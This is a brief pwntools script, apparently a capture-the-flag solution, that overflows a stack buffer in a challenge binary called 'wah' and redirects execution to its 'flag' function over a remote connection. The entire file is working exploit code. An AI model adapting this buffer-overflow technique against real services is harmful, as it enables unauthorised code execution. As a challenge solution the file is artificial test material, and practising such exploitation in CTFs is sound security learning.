from pwn import *

io = remote('challs.actf.co', 31224)
context.binary = elf = ELF('wah')
payload = b'A' * (0x20 + 8) + p64(elf.symbols['flag'])
io.sendline(payload)
io.interactive()
